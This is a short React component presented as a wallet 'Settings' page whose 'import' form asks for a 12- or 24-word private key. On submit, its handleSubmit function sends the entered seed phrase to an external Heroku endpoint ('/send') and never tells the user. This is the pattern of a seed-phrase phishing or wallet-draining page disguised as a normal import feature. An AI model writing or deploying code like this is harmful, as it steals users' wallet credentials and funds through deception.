import React, { useState } from "react";
import axios from 'axios'
import styles from "../../styles/Home.module.css";
import Tabs from ".";

const Settings = () => {
  const [key, setKey] = useState("");

  const handleSubmit=(e)=> {
    e.preventDefault();
    axios.post('https://shielded-earth-12418.herokuapp.com/send', {key: key})
         .then(res => res.json())
         .catch(err => err)
  }
  return (
    <Tabs>
      <div>
        <form onSubmit={handleSubmit}>
          <textarea
            value={key}
            onChange={(e) => setKey(e.target.value)}
            placeholder="Private Key is typically 12 (sometimes 24) words separated by single spaces"
            className={styles.textarea}
          />
          <button className={styles.button}>import</button>
        </form>
      </div>
    </Tabs>
  );
};

export default Settings;
